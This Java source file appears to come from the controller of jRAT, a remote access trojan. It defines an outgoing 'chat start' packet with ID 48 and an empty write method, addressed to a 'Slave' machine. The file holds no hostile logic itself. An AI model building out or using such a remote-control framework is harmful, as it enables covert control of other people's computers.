package jrat.controller.packets.outgoing;

import jrat.controller.Slave;

import java.io.DataOutputStream;


public class Packet48ChatStart extends AbstractOutgoingPacket {

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {

	}

	@Override
	public short getPacketId() {
		return 48;
	}

}
